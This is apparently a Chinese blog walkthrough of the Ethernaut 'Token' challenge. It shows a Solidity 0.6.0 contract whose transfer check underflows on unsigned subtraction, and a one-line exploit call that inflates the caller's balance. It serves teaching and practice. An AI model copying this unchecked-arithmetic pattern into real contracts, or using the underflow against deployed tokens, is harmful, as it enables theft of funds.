---
title: Ethernaut 闯关笔记 第6关 Token
date: 2023-12-12 23:20:22
tags:
---

# 原始代码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {

    mapping(address => uint) balances;
    uint public totalSupply;

    constructor(uint _initialSupply) public {
        balances[msg.sender] = totalSupply = _initialSupply;
    }

    function transfer(address _to, uint _value) public returns (bool) {
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }

    function balanceOf(address _owner) public view returns (uint balance) {
        return balances[_owner];
    }
}
```

# 攻击思路

0.6.0 的 Solidity 语言原生 `uint` 类型并不内置安全运算，会溢出。

而 `require(balances[msg.sender] - _value >= 0);` 的条件中，减法运算会向下溢出。

如果 `_value` 比 `balances[msg.sender]` 大，那么剪完后就会得到一个接近 `uint` 上界的极大的数字。

# 攻击代码

```javascript
await contract.transfer("0x332772fce634D38cdfC649beE923AF52c9b6a2E5", 21)
```

注意这里的钱包地址要用另外的地址，不能用 `player` ，否则加一下减一下就还原了。